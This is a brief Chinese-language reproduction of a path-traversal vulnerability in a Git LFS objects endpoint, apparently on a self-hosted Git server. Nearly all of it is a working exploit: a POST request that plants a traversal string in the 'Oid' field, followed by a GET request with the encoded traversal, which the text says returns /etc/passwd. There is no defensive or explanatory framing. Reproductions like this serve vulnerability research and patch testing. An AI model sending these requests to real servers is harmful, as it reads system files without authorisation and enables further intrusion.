# 漏洞复现
发送数据包，添加一个Git LFS对象：
```
POST /root/repo.git/info/lfs/objects HTTP/1.1
Content-Type: application/json

{
    "Oid": "....../../../etc/passwd",
    "Size": 1000000,
    "User" : "a",
    "Password" : "a",
    "Repo" : "a",
    "Authorization" : "a"
}
```
然后就可以：
```
GET /root/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth HTTP/1.1
```
就会返回/etc/passwd
